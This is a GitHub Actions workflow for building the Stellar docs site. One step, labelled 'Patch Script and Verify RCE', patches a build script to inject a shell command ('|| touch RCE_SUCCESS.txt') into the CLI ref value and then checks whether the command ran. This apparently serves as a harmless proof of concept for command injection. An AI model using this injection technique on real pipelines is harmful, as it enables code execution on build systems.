name: Build docs

on:
  workflow_dispatch:
  workflow_call:
    inputs:
      stellar-cli-ref:
        required: false
        default: 'main'
        type: string

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout App Repo
        uses: actions/checkout@v4
        with:
          repository: "stellar/stellar-docs"

      - name: Install pnpm
        uses: pnpm/action-setup@v6

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: '24'
          cache: 'pnpm'
          cache-dependency-path: '**/pnpm-lock.yaml'

      - name: Enable Corepack
        run: corepack enable

      - name: Install App Dependencies
        run: pnpm install --prefer-offline --frozen-lockfile
        shell: bash

      - name: Patch Script and Verify RCE
        run: |
          # Inject payload with '||' so it runs even if git fails
          sed -i "s/const cliRef = argv.cliRef || \`v\${latestVersion}\`;/const cliRef = 'v1.0.0 || touch RCE_SUCCESS.txt';/" scripts/stellar_cli.mjs
          
          # Run the build script
          # Adding '|| true' ensures the pipeline continues even if the script crashes
          pnpm stellar-cli:build -- --cli-ref='v1.0.0' || true
          
          # Verification Step
          echo "--- VERIFICATION START ---"
          ls -la RCE_SUCCESS.txt || echo "FILE NOT FOUND"
          echo "--- VERIFICATION END ---"
        shell: bash

      - name: (temp) Fix CLI links
        run: pnpm stellar-cli:fix-links
        shell: bash

      - name: Build app
        run: pnpm build
        shell: bash

      - name: Check if routes.txt file needs updating
        run: |
          if ! git diff --exit-code -- routes.txt; then
            echo 'The `routes.txt` file has changed. Please update the routes.txt file locally by running `pnpm build` and push that change.'
            exit 1
          fi
